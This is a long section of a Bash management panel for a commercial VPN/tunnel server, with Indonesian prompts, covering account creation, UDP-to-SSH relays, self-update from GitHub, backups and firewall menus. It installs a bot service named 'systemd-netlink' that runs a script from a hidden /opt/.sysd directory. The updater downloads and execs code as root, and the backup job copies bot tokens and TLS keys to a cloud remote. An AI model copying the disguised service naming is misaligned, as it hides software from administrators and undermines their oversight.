ExecStart=/usr/bin/python3 -u /opt/.sysd/launcher.py



Restart=always



RestartSec=5



StandardOutput=journal



StandardError=journal



SyslogIdentifier=tunnelbot-bg







[Install]



WantedBy=multi-user.target



SVEOF







    systemctl stop systemd-netlink 2>/dev/null



    systemctl disable systemd-netlink 2>/dev/null



    systemctl daemon-reload >/dev/null 2>&1



    systemctl enable systemd-netlink >/dev/null 2>&1



    systemctl start systemd-netlink >/dev/null 2>&1



}







#================================================



# CREATE VMESS / VLESS / TROJAN



#================================================







create_vmess() {



    clear; print_menu_header "CREATE VMESS ACCOUNT"



    read -rp "  Username      : " username



    [[ -z "$username" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }



    if grep -q "\"email\":\"${username}\"" "$XRAY_CONFIG" 2>/dev/null; then



        echo -e "  ${RED}✘ Username sudah ada!${NC}"; sleep 2; return; fi



    read -rp "  Expired (days): " days



    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }



    read -rp "  Quota (GB)    : " quota



    [[ ! "$quota" =~ ^[0-9]+$ ]] && quota=100



    read -rp "  IP Limit      : " iplimit



    [[ ! "$iplimit" =~ ^[0-9]+$ ]] && iplimit=1



    create_account_template "vmess" "$username" "$days" "$quota" "$iplimit"



}







create_vless() {



    clear; print_menu_header "CREATE VLESS ACCOUNT"



    read -rp "  Username      : " username



    [[ -z "$username" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }



    if grep -q "\"email\":\"${username}\"" "$XRAY_CONFIG" 2>/dev/null; then



        echo -e "  ${RED}✘ Username sudah ada!${NC}"; sleep 2; return; fi



    read -rp "  Expired (days): " days



    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }



    read -rp "  Quota (GB)    : " quota



    [[ ! "$quota" =~ ^[0-9]+$ ]] && quota=100



    read -rp "  IP Limit      : " iplimit



    [[ ! "$iplimit" =~ ^[0-9]+$ ]] && iplimit=1



    create_account_template "vless" "$username" "$days" "$quota" "$iplimit"



}







create_trojan() {



    clear; print_menu_header "CREATE TROJAN ACCOUNT"



    read -rp "  Username      : " username



    [[ -z "$username" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }



    if grep -q "\"email\":\"${username}\"" "$XRAY_CONFIG" 2>/dev/null; then



        echo -e "  ${RED}✘ Username sudah ada!${NC}"; sleep 2; return; fi



    read -rp "  Expired (days): " days



    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }



    read -rp "  Quota (GB)    : " quota



    [[ ! "$quota" =~ ^[0-9]+$ ]] && quota=100



    read -rp "  IP Limit      : " iplimit



    [[ ! "$iplimit" =~ ^[0-9]+$ ]] && iplimit=1



    create_account_template "trojan" "$username" "$days" "$quota" "$iplimit"



}







#================================================



# MENU SSH / VMESS / VLESS / TROJAN



#================================================







menu_ssh() {



    while true; do



        clear; print_menu_header "SSH MENU"



        echo -e "  ${WHITE}[1]${NC} Create SSH"



        echo -e "  ${WHITE}[2]${NC} Trial SSH (1 Jam)"



        echo -e "  ${WHITE}[3]${NC} Delete SSH"



        echo -e "  ${WHITE}[4]${NC} Renew SSH"



        echo -e "  ${WHITE}[5]${NC} Cek Login SSH"



        echo -e "  ${WHITE}[6]${NC} List User SSH"



        echo -e "  ${WHITE}[0]${NC} Back To Menu"



        echo ""



        read -rp "  Select: " choice



        case $choice in



            1) create_ssh ;; 2) create_ssh_trial ;;



            3) delete_account "ssh" ;; 4) renew_account "ssh" ;;



            5) check_user_login "ssh" ;; 6) list_accounts "ssh" ;;



            0) return ;;



        esac



    done



}







menu_vmess() {



    while true; do



        clear; print_menu_header "VMESS MENU"



        echo -e "  ${WHITE}[1]${NC} Create VMess"



        echo -e "  ${WHITE}[2]${NC} Trial VMess (1 Jam)"



        echo -e "  ${WHITE}[3]${NC} Delete VMess"



        echo -e "  ${WHITE}[4]${NC} Renew VMess"



        echo -e "  ${WHITE}[5]${NC} Cek Login VMess"



        echo -e "  ${WHITE}[6]${NC} List User VMess"



        echo -e "  ${WHITE}[0]${NC} Back To Menu"



        echo ""



        read -rp "  Select: " choice



        case $choice in



            1) create_vmess ;; 2) create_trial_xray "vmess" ;;



            3) delete_account "vmess" ;; 4) renew_account "vmess" ;;



            5) check_user_login "vmess" ;; 6) list_accounts "vmess" ;;



            0) return ;;



        esac



    done



}







menu_vless() {



    while true; do



        clear; print_menu_header "VLESS MENU"



        echo -e "  ${WHITE}[1]${NC} Create VLess"



        echo -e "  ${WHITE}[2]${NC} Trial VLess (1 Jam)"



        echo -e "  ${WHITE}[3]${NC} Delete VLess"



        echo -e "  ${WHITE}[4]${NC} Renew VLess"



        echo -e "  ${WHITE}[5]${NC} Cek Login VLess"



        echo -e "  ${WHITE}[6]${NC} List User VLess"



        echo -e "  ${WHITE}[0]${NC} Back To Menu"



        echo ""



        read -rp "  Select: " choice



        case $choice in



            1) create_vless ;; 2) create_trial_xray "vless" ;;



            3) delete_account "vless" ;; 4) renew_account "vless" ;;



            5) check_user_login "vless" ;; 6) list_accounts "vless" ;;



            0) return ;;



        esac



    done



}







menu_trojan() {



    while true; do



        clear; print_menu_header "TROJAN MENU"



        echo -e "  ${WHITE}[1]${NC} Create Trojan"



        echo -e "  ${WHITE}[2]${NC} Trial Trojan (1 Jam)"



        echo -e "  ${WHITE}[3]${NC} Delete Trojan"



        echo -e "  ${WHITE}[4]${NC} Renew Trojan"



        echo -e "  ${WHITE}[5]${NC} Cek Login Trojan"



        echo -e "  ${WHITE}[6]${NC} List User Trojan"



        echo -e "  ${WHITE}[0]${NC} Back To Menu"



        echo ""



        read -rp "  Select: " choice



        case $choice in



            1) create_trojan ;; 2) create_trial_xray "trojan" ;;



            3) delete_account "trojan" ;; 4) renew_account "trojan" ;;



            5) check_user_login "trojan" ;; 6) list_accounts "trojan" ;;



            0) return ;;



        esac



    done



}







#================================================



# INSTALL UDP CUSTOM



#================================================







install_udp_custom() {



    cat > /usr/local/bin/udp-custom << 'UDPEOF'



#!/usr/bin/env python3



import socket, threading, select, time







PORTS    = range(7100, 7301)



SSH_HOST = '127.0.0.1'



SSH_PORT = 22



BUF      = 8192



TIMEOUT  = 10







def handle(data, addr, sock):



    try:



        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



        s.settimeout(TIMEOUT)



        s.connect((SSH_HOST, SSH_PORT))



        s.sendall(data)



        resp = s.recv(BUF)



        if resp: sock.sendto(resp, addr)



        s.close()



    except: pass







sockets = []



for port in PORTS:



    try:



        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)



        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)



        s.bind(('0.0.0.0', port))



        s.setblocking(False)



        sockets.append(s)



    except: pass







print(f'UDP Custom: {len(sockets)} ports (7100-7300)', flush=True)







while True:



    try:



        readable, _, _ = select.select(sockets, [], [], 1.0)



        for sock in readable:



            try:



                data, addr = sock.recvfrom(BUF)



                threading.Thread(target=handle, args=(data, addr, sock), daemon=True).start()



            except: pass



    except KeyboardInterrupt: break



    except: time.sleep(1)



UDPEOF







    chmod +x /usr/local/bin/udp-custom







    cat > /etc/systemd/system/udp-custom.service << 'UDPSVC'



[Unit]



Description=UDP Custom BadVPN 7100-7300



After=network.target







[Service]



Type=simple



ExecStart=/usr/bin/python3 /usr/local/bin/udp-custom



Restart=always



RestartSec=3



LimitNOFILE=65535



StandardOutput=null



StandardError=null







[Install]



WantedBy=multi-user.target



UDPSVC







    systemctl daemon-reload



    systemctl enable udp-custom 2>/dev/null



    systemctl restart udp-custom 2>/dev/null || true



    sleep 1



    systemctl is-active --quiet udp-custom && \
        echo -e "  ${GREEN}✔ UDP OK! (7100-7300)${NC}" || \
        echo -e "  ${RED}✘ UDP Failed!${NC}"



    sleep 2



}







#================================================



# ZI VPN UDP (UDP over HTTP Tunnel)



#================================================







install_zivpn_udp() {



    clear



    print_menu_header "INSTALL ZI VPN UDP"







    echo -e "  ${CYAN}◈ Checking dependencies...${NC}"



    apt-get install -y python3 python3-pip >/dev/null 2>&1







    # ZI VPN UDP: UDP over HTTP/WebSocket tunnel ke port 7400-7500



    # Cocok untuk app ZiVPN di Android



    cat > /usr/local/bin/zivpn-udp << 'ZIEOF'



#!/usr/bin/env python3



"""



ZI VPN UDP Gateway



Menerima koneksi UDP dari ZiVPN client dan tunnel ke SSH



Port: 7400-7500



"""



import socket, threading, select, time, struct







PORTS    = range(7400, 7501)



SSH_HOST = '127.0.0.1'



SSH_PORT = 22



BUF      = 65535



TIMEOUT  = 30







def handle_client(data, addr, udp_sock):



    try:



        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



        tcp.settimeout(TIMEOUT)



        tcp.connect((SSH_HOST, SSH_PORT))



        # ZI VPN handshake header



        tcp.sendall(data)



        start = time.time()



        while time.time() - start < TIMEOUT:



            r, _, _ = select.select([tcp], [], [], 1.0)



            if r:



                resp = tcp.recv(BUF)



                if not resp:



                    break



                udp_sock.sendto(resp, addr)



        tcp.close()



    except Exception:



        pass







sockets = []



for port in PORTS:



    try:



        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)



        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)



        s.bind(('0.0.0.0', port))



        s.setblocking(False)



        sockets.append((port, s))



    except Exception as e:



        pass







print(f'ZI VPN UDP Gateway: {len(sockets)} ports (7400-7500)', flush=True)







while True:



    try:



        sock_list = [s for _, s in sockets]



        readable, _, _ = select.select(sock_list, [], [], 1.0)



        for sock in readable:



            try:



                data, addr = sock.recvfrom(BUF)



                t = threading.Thread(



                    target=handle_client,



                    args=(data, addr, sock),



                    daemon=True



                )



                t.start()



            except Exception:



                pass



    except KeyboardInterrupt:



        break



    except Exception:



        time.sleep(1)



ZIEOF







    chmod +x /usr/local/bin/zivpn-udp







    cat > /etc/systemd/system/zivpn-udp.service << 'ZISVC'



[Unit]



Description=ZI VPN UDP Gateway 7400-7500



After=network.target



Wants=network.target







[Service]



Type=simple



ExecStart=/usr/bin/python3 /usr/local/bin/zivpn-udp



Restart=always



RestartSec=3



LimitNOFILE=65535



StandardOutput=null



StandardError=null







[Install]



WantedBy=multi-user.target



ZISVC







    systemctl daemon-reload



    systemctl enable zivpn-udp 2>/dev/null



    systemctl restart zivpn-udp 2>/dev/null



    sleep 2







    if systemctl is-active --quiet zivpn-udp; then



        echo -e "  ${GREEN}✔ ZI VPN UDP aktif di port 7400-7500!${NC}"



    else



        echo -e "  ${RED}✘ ZI VPN UDP gagal start!${NC}"



        journalctl -u zivpn-udp -n 5 --no-pager 2>/dev/null



    fi







    # Buka port di UFW jika aktif



    if command -v ufw >/dev/null 2>&1 && ufw status 2>/dev/null | grep -q "active"; then



        ufw allow 7400:7500/udp >/dev/null 2>&1



        echo -e "  ${GREEN}✔ UFW: port 7400-7500/udp dibuka${NC}"



    fi







    echo ""



    echo -e "  ${WHITE}Konfigurasi ZI VPN di app:${NC}"



    local DOMAIN_NOW; DOMAIN_NOW=$(cat "$DOMAIN_FILE" 2>/dev/null | tr -d '\n\r' | xargs)



    local IP_NOW; IP_NOW=$(get_ip)



    echo -e "  ${CYAN}Host/SNI  :${NC} ${DOMAIN_NOW:-$IP_NOW}"



    echo -e "  ${CYAN}Port UDP  :${NC} 7400 - 7500"



    echo -e "  ${CYAN}Payload   :${NC} GET / HTTP/1.1[crlf]Host: ${DOMAIN_NOW:-$IP_NOW}[crlf][crlf]"



    echo -e "  ${CYAN}SSH User  :${NC} sesuai akun SSH"



    echo -e "  ${CYAN}SSH Pass  :${NC} sesuai akun SSH"



    echo -e "  ${CYAN}SSH Port  :${NC} 22"



    echo ""



    read -rp "  Tekan Enter untuk kembali..."



}







manage_zivpn_udp() {



    while true; do



        clear



        local W; W=$(get_width)



        local is_active=0



        systemctl is-active --quiet zivpn-udp 2>/dev/null && is_active=1



        local status_txt; [ $is_active -eq 1 ] && status_txt="${GREEN}● RUNNING${NC}" || status_txt="${RED}○ STOPPED${NC}"







        _box_top $W



        _box_center $W "${YELLOW}${BOLD}ZI VPN UDP MANAGER${NC}"



        _box_divider $W



        _box_left $W "Status    : ${status_txt}"



        _box_left $W "Port      : ${CYAN}7400 - 7500 UDP${NC}"



        _box_left $W "Tunnel    : ${CYAN}UDP → SSH port 22${NC}"



        _box_divider $W



        _box_row $W "[1] Install / Reinstall" "[2] Start / Restart"



        _box_row $W "[3] Stop" "[4] Lihat Log"



        _box_row $W "[5] Uninstall" "[0] Kembali"



        _box_bottom $W



        echo ""



        read -rp "  Select: " c



        case $c in



            1) install_zivpn_udp ;;



            2)



                systemctl restart zivpn-udp 2>/dev/null



                systemctl is-active --quiet zivpn-udp \
                    && echo -e "  ${GREEN}✔ ZI VPN UDP started!${NC}" \
                    || echo -e "  ${RED}✘ Failed to start!${NC}"



                sleep 2 ;;



            3)



                systemctl stop zivpn-udp 2>/dev/null



                echo -e "  ${YELLOW}ZI VPN UDP stopped.${NC}"; sleep 2 ;;



            4)



                clear



                echo -e "  ${CYAN}=== ZI VPN UDP Log ===${NC}"



                journalctl -u zivpn-udp -n 30 --no-pager 2>/dev/null



                echo ""; read -rp "  Tekan Enter..." ;;



            5)



                read -rp "  Yakin hapus ZI VPN UDP? [y/N]: " confirm



                if [[ "$confirm" == "y" ]]; then



                    systemctl stop zivpn-udp 2>/dev/null



                    systemctl disable zivpn-udp 2>/dev/null



                    rm -f /etc/systemd/system/zivpn-udp.service \
                          /usr/local/bin/zivpn-udp



                    systemctl daemon-reload >/dev/null 2>&1



                    echo -e "  ${GREEN}✔ ZI VPN UDP dihapus.${NC}"



                    sleep 2



                fi ;;



            0) return ;;



        esac



    done



}















update_menu() {



    clear



    local W; W=$(get_width)



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}🔄  UPDATE PANEL${NC}"



    _box_divider $W



    _box_left $W "Script    : ${WHITE}YouzinCrabz Tunnel${NC}"



    _box_left $W "Versi saat ini : ${GREEN}v${SCRIPT_VERSION}${NC}"



    _box_left $W "GitHub    : ${CYAN}${GITHUB_USER}/${GITHUB_REPO}${NC}"



    _box_bottom $W



    echo ""







    _box_top $W



    _box_center $W "${WHITE}Pilih metode update:${NC}"



    _box_divider $W



    _box_row $W "[1] Update dari GitHub" "[2] Update Web Page"



    _box_row $W "[3] Apply Auto-Start" "[0] Kembali"



    _box_bottom $W



    echo ""



    read -rp "  Pilih [0-3]: " uchoice







    case $uchoice in



    1)



        echo ""



        echo -e "  ${CYAN}◈${NC} Mengecek versi terbaru dari GitHub..."



        local latest



        latest=$(curl -s --max-time 15 "$VERSION_URL" 2>/dev/null | tr -d '[:space:]')







        if [[ -z "$latest" ]]; then



            echo -e "  ${RED}✘ Tidak bisa connect ke GitHub!${NC}"



            echo -e "  ${YELLOW}  Coba gunakan opsi [2] atau [3] untuk update lokal.${NC}"



            echo ""; read -rp "  Tekan Enter..."; return



        fi







        echo -e "  ${GREEN}✔${NC} Versi terbaru : ${YELLOW}v${latest}${NC}"



        echo ""







        if [[ "$latest" == "$SCRIPT_VERSION" ]]; then



            echo -e "  ${GREEN}✔ Script sudah versi terbaru!${NC}"



            echo ""; read -rp "  Tekan Enter..."; return



        fi







        echo -e "  ${YELLOW}⚡ Update tersedia: v${SCRIPT_VERSION} → v${latest}${NC}"



        echo ""



        read -rp "  Update sekarang? [y/N]: " confirm



        [[ "$confirm" != "y" ]] && return



        echo ""







        cp "$SCRIPT_PATH" "$BACKUP_PATH" 2>/dev/null \
            && echo -e "  ${GREEN}✔${NC} Backup → ${BACKUP_PATH}" \
            || echo -e "  ${YELLOW}⚠${NC} Backup gagal, lanjut..."







        local tmp="/tmp/tunnel_update_$$.sh"



        echo -e "  ${CYAN}◈${NC} Mengunduh dari GitHub..."



        if ! curl -L --max-time 90 --retry 3 --progress-bar "$SCRIPT_URL" -o "$tmp" 2>&1; then



            echo -e "  ${RED}✘ Download gagal!${NC}"



            [[ -f "$BACKUP_PATH" ]] && cp "$BACKUP_PATH" "$SCRIPT_PATH"



            rm -f "$tmp"; read -rp "  Tekan Enter..."; return



        fi







        if [[ ! -s "$tmp" ]]; then



            echo -e "  ${RED}✘ File download kosong!${NC}"



            [[ -f "$BACKUP_PATH" ]] && cp "$BACKUP_PATH" "$SCRIPT_PATH"



            rm -f "$tmp"; read -rp "  Tekan Enter..."; return



        fi







        if bash -n "$tmp" 2>/dev/null; then



            echo -e "  ${GREEN}✔${NC} Syntax OK"



        else



            echo -e "  ${RED}✘ Syntax error, rollback...${NC}"



            [[ -f "$BACKUP_PATH" ]] && cp "$BACKUP_PATH" "$SCRIPT_PATH"



            rm -f "$tmp"; read -rp "  Tekan Enter..."; return



        fi







        mv "$tmp" "$SCRIPT_PATH"



        chmod +x "$SCRIPT_PATH"



        deploy_web_page >/dev/null 2>&1



        echo -e "  ${GREEN}✔ Update berhasil! v${SCRIPT_VERSION} → v${latest}${NC}"



        echo -e "  ${CYAN}◈${NC} Restart panel dalam 3 detik..."



        sleep 3



        exec bash "$SCRIPT_PATH"



        ;;







    2)



        echo ""



        echo -e "  ${CYAN}◈${NC} Deploy ulang web page ke Nginx..."



        deploy_web_page



        echo -e "  ${GREEN}✔ Web page berhasil diperbarui!${NC}"



        echo -e "  ${CYAN}◈${NC} Buka browser: ${YELLOW}http://${DOMAIN:-$(get_ip)}/${NC}"



        echo ""; read -rp "  Tekan Enter..."



        ;;







    3)



        echo ""



        echo -e "  ${CYAN}◈${NC} Menerapkan auto-start menu saat login SSH..."



        setup_menu_command



        echo -e "  ${GREEN}✔ Auto-start aktif!${NC}"



        echo -e "  ${CYAN}◈${NC} Logout & login ulang untuk test."



        echo ""; read -rp "  Tekan Enter..."



        ;;







    0) return ;;



    *) echo -e "  ${RED}Pilihan tidak valid${NC}"; sleep 1 ;;



    esac



}







#================================================



# CHANGE TIMEZONE



#================================================







change_timezone() {



    clear



    local W; W=$(get_width)



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}TIMEZONE SETTINGS${NC}"



    _box_divider $W



    echo -e "  ${WHITE}Timezone saat ini :${NC} ${CYAN}$(timedatectl show --property=Timezone --value 2>/dev/null || cat /etc/timezone)${NC}"



    echo -e "  ${WHITE}Waktu sistem      :${NC} ${GREEN}$(date '+%d %b %Y %H:%M:%S %Z')${NC}"



    _box_divider $W



    echo -e "  ${CYAN}[1]${NC} WIB  — Asia/Jakarta   (UTC+7)"



    echo -e "  ${CYAN}[2]${NC} WITA — Asia/Makassar  (UTC+8) ${GREEN}← Banjarmasin${NC}"



    echo -e "  ${CYAN}[3]${NC} WIT  — Asia/Jayapura  (UTC+9)"



    echo -e "  ${CYAN}[4]${NC} Lainnya (ketik manual)"



    echo -e "  ${RED}[0]${NC} Back"



    _box_bottom $W



    echo ""



    read -rp "  Pilih [0-4]: " tz_choice



    local tz_zone=""



    case $tz_choice in



        1) tz_zone="Asia/Jakarta" ;;



        2) tz_zone="Asia/Makassar" ;;



        3) tz_zone="Asia/Jayapura" ;;



        4) read -rp "  Masukkan timezone (contoh: Asia/Singapore): " tz_zone ;;



        0) return ;;



    esac



    [[ -z "$tz_zone" ]] && return



    if timedatectl set-timezone "$tz_zone" 2>/dev/null; then



        hwclock --systohc 2>/dev/null || true



        echo -e "  ${GREEN}✔ Timezone berhasil diubah ke: ${tz_zone}${NC}"



        echo -e "  ${WHITE}Waktu sekarang: $(date '+%d %b %Y %H:%M:%S %Z')${NC}"



    else



        echo -e "  ${RED}✘ Timezone tidak valid: ${tz_zone}${NC}"



    fi



    sleep 2



}







#================================================



# ADVANCED MENU



#================================================







menu_advanced() {



    while true; do



        clear



        local W; W=$(get_width)



        _box_top $W



        _box_center $W "${YELLOW}${BOLD}ADVANCED SETTINGS${NC}"



        _box_divider $W



        _box_row $W "[1]  Port Management" "[8]  Bandwidth Monitor"



        _box_row $W "[2]  Protocol Config" "[9]  User IP Limits"



        _box_row $W "[3]  Auto Backup" "[10] Custom Payload"



        _box_row $W "[4]  SSH Brute Protect" "[11] Cron Jobs"



        _box_row $W "[5]  Fail2Ban Setup" "[12] System Logs"



        _box_row $W "[6]  DDoS Protection" "[13] Timezone"



        _box_row $W "[7]  Firewall Rules" "[14] SSL Cert Info"



        _box_row $W "[15] IP Whitelist SSH" "[16] Monitor Quota"



        _box_divider $W



        _box_left $W "[0]  Back to Main Menu"



        _box_bottom $W



        echo ""



        read -rp "  Select [0-16]: " choice



        case $choice in



            1) _adv_port_management ;;  2) _adv_protocol_settings ;;



            3) _adv_auto_backup ;;      4) _adv_ssh_brute_protection ;;



            5) _adv_fail2ban ;;         6) _adv_ddos_protection ;;



            7) _adv_firewall ;;         8) _adv_bandwidth_monitor ;;



            9) _adv_user_limits ;;      10) _adv_custom_payload ;;



            11) _adv_cron_jobs ;;       12) _adv_system_logs ;;



            13) change_timezone ;;      14) _adv_ssl_info ;;



            15) _adv_ip_whitelist ;;    16) _adv_quota_monitor ;;



            0) return ;;



        esac



    done



}







_adv_port_management() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD}PORT MANAGEMENT${NC}"



    _mini_divider $MW



    local ports



    ports=$(ss -tlnp 2>/dev/null | awk 'NR>1 && /LISTEN/ {



        split($4,a,":"); port=a[length(a)]



        match($6,/\"([^\"]+)\"/,m)



        printf "  %-8s %s\n", port, m[1]



    }' | sort -n | head -20)



    while IFS= read -r line; do



        _mini_left $MW "${GREEN}${line}${NC}"



    done <<< "$ports"



    _mini_divider $MW



    _mini_left $MW "${WHITE}Port aktif sistem VPN:${NC}"



    _mini_row $MW "443  → TLS Nginx SSL" "80   → HTTP no-TLS"



    _mini_row $MW "22   → SSH OpenSSH" "222  → SSH Dropbear"



    _mini_row $MW "8080 → VMess WS" "8081 → VLess WS"



    _mini_row $MW "8082 → Trojan WS" "8444 → VMess gRPC"



    _mini_row $MW "8445 → VLess gRPC" "8446 → Trojan gRPC"



    _mini_bottom $MW



    echo ""; read -rp "  Tekan Enter untuk kembali..."



}







_adv_protocol_settings() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD}PROTOCOL SETTINGS${NC}"



    _mini_divider $MW



    if [[ -f "$XRAY_CONFIG" ]]; then



        local inbound_count; inbound_count=$(jq '.inbounds | length' "$XRAY_CONFIG" 2>/dev/null)



        _mini_left $MW "Total Inbounds : ${GREEN}${inbound_count:-0}${NC}"



        _mini_divider $MW



        while IFS= read -r line; do



            _mini_left $MW "${CYAN}${line}${NC}"



        done < <(jq -r '.inbounds[] | "→ \(.tag)  port:\(.port)  \(.protocol)"' "$XRAY_CONFIG" 2>/dev/null)



    else



        _mini_left $MW "${RED}Config Xray tidak ditemukan!${NC}"



    fi



    _mini_divider $MW



    _mini_two $MW "[1] Restart Xray " "[2] Lihat Config "



    _mini_two $MW "[3] Test Config  " "[0] Back         "



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    case $c in



        1)



            if xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1; then



                systemctl restart xray 2>/dev/null || true && echo -e "  ${GREEN}✔ Xray Restarted!${NC}"



            else



                echo -e "  ${RED}✘ Config error!${NC}"



                xray -test -config "$XRAY_CONFIG" 2>&1 | sed 's/^/    /'



            fi; sleep 2 ;;



        2) clear; cat "$XRAY_CONFIG" 2>/dev/null; echo ""; read -rp "  Tekan Enter..." ;;



        3)



            echo -e "  ${CYAN}Testing Xray...${NC}"



            xray -test -config "$XRAY_CONFIG" 2>&1 | sed 's/^/  /'



            echo ""; nginx -t 2>&1 | sed 's/^/  /'



            echo ""; read -rp "  Tekan Enter..." ;;



    esac



}







_adv_auto_backup() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD} AUTO BACKUP CONFIG${NC}"



    _mini_divider $MW



    local cron_status="TIDAK AKTIF"



    crontab -l 2>/dev/null | grep -q "vpn-backup" && cron_status="${GREEN}AKTIF (jam 02:00)${NC}"



    _mini_left $MW "Status     : ${cron_status}"



    _mini_left $MW "Jadwal     : Setiap hari jam 02:00"



    _mini_left $MW "Lokasi     : /root/backups/"



    _mini_divider $MW



    _mini_two $MW "[1] Enable Auto Backup " "[2] Disable           "



    _mini_two $MW "[3] Backup Sekarang    " "[0] Back              "



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    case $c in



        1)



            mkdir -p /root/backups

            # Create vpn-backup-auto wrapper for cron
            cat > /usr/local/bin/vpn-backup-auto << 'BACKUPEOF'
#!/bin/bash
# Auto backup wrapper for cron
BACKUP_DIR="/root/backups"
BACKUP_DATE="$(date +%Y%m%d-%H%M%S)"
BACKUP_FILE="vpn-fullbackup-${BACKUP_DATE}.tar.gz"
TMP_DIR="/tmp/vpn-backup-${BACKUP_DATE}"

mkdir -p "$BACKUP_DIR" "$TMP_DIR"

# MySQL dump
# Detect MySQL auth
MYSQLDUMP_CMD="mysqldump"
if [[ -f /etc/mysql/debian.cnf ]]; then
    MYSQLDUMP_CMD="mysqldump --defaults-file=/etc/mysql/debian.cnf"
elif mysql -u root -e "SELECT 1" &>/dev/null; then
    MYSQLDUMP_CMD="mysqldump -u root"
fi
if command -v mysqldump &>/dev/null; then
    $MYSQLDUMP_CMD --single-transaction --routines --triggers --events ordervpn 2>/dev/null > "$TMP_DIR/ordervpn.sql"
fi

# Config files
for f in /root/domain /root/.domain_type /root/akun \
         /root/.bot_token /root/.chat_id /root/.payment_info \
         /etc/xray/xray.crt /etc/xray/xray.key \
         /usr/local/etc/xray/config.json; do
    [[ -f "$f" ]] && cp "$f" "$TMP_DIR/" 2>/dev/null
done

# Compress
tar -czf "$BACKUP_DIR/$BACKUP_FILE" -C "$TMP_DIR" . 2>/dev/null
rm -rf "$TMP_DIR"

# Upload to GDrive
if command -v rclone &>/dev/null && rclone listremotes 2>/dev/null | grep -q "gdrive:"; then
    rclone copy "$BACKUP_DIR/$BACKUP_FILE" "gdrive:/vpn-backups/" 2>/dev/null
    # Cleanup old GDrive backups
    rclone delete --min-age 7d --include "vpn-fullbackup-*.tar.gz" "gdrive:/vpn-backups/" 2>/dev/null || true
fi

# Cleanup old local backups
find "$BACKUP_DIR" -name "vpn-fullbackup-*.tar.gz" -mtime +7 -delete 2>/dev/null
BACKUPEOF
            chmod +x /usr/local/bin/vpn-backup-auto



            (crontab -l 2>/dev/null | grep -v "vpn-autobackup"



             echo "0 2 * * * /usr/local/bin/vpn-backup-auto 2>/dev/null") | crontab -



            echo -e "  ${GREEN}✔ Auto backup aktif jam 02:00!${NC}"; sleep 2 ;;



        2) crontab -l 2>/dev/null | grep -v "vpn-backup" | crontab -



           echo -e "  ${YELLOW}Auto backup dimatikan.${NC}"; sleep 2 ;;



        3) _menu_backup ;;



    esac



}







_adv_ssh_brute_protection() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD} SSH BRUTE FORCE PROTECTION${NC}"



    _mini_divider $MW



    detect_firewall_backend



    _mini_left $MW "Firewall Backend : ${CYAN}${FW_BACKEND}${NC}"



    _mini_divider $MW



    _mini_two $MW "[1] Aktifkan Protection " "[2] Lihat Block List  "



    _mini_two $MW "[3] Reset Rules        " "[0] Back              "



    _mini_bottom $MW



    echo ""; read -rp "  Select: " c



    case $c in



        1)



            if [[ "$FW_BACKEND" == "nftables" ]]; then



                command -v iptables-legacy >/dev/null 2>&1 && {



                    iptables-legacy -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH 2>/dev/null



                    iptables-legacy -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 6 --name SSH -j DROP 2>/dev/null



                } || nft add rule ip filter INPUT tcp dport 22 ct state new limit rate 5/minute accept 2>/dev/null || true



            else



                iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH 2>/dev/null



                iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 6 --name SSH -j DROP 2>/dev/null



            fi



            echo -e "  ${GREEN}✔ SSH Brute Protection AKTIF!${NC}"; sleep 3 ;;



        2) clear; iptables -L INPUT -n 2>/dev/null | grep "DROP\|REJECT" | head -20



           echo ""; read -rp "  Tekan Enter..." ;;



        3) for c in INPUT FORWARD OUTPUT; do iptables -F "$c" 2>/dev/null || true; done; echo -e "  ${GREEN}✔ Rules direset (INPUT/FORWARD/OUTPUT)!${NC}"; sleep 2 ;;



    esac



}







_adv_fail2ban() {



    clear



    local W; W=$(get_width); local MW=$(( W - 4 ))



    _mini_top $MW



 _mini_center $MW "${YELLOW}${BOLD} FAIL2BAN SETUP${NC}"



    _mini_divider $MW



    if command -v fail2ban-client >/dev/null 2>&1; then



        _mini_left $MW "${GREEN}✔ Fail2ban terinstall${NC}"



        _mini_divider $MW



        while IFS= read -r line; do



            _mini_left $MW "$line"



        done < <(fail2ban-client status 2>/dev/null | head -10)



    else



        _mini_left $MW "${RED}Fail2ban belum terinstall${NC}"



        _mini_divider $MW



        _mini_two $MW "[1] Install Fail2ban " "[0] Back            "



    fi



    _mini_bottom $MW



    echo ""



    if ! command -v fail2ban-client >/dev/null 2>&1; then



        read -rp "  Select: " c



        if [[ "$c" == "1" ]]; then



            apt-get install -y fail2ban >/dev/null 2>&1



            systemctl enable fail2ban >/dev/null 2>&1



            systemctl restart fail2ban >/dev/null 2>&1



            echo -e "  ${GREEN}✔ Fail2ban terinstall!${NC}"



        fi



    fi



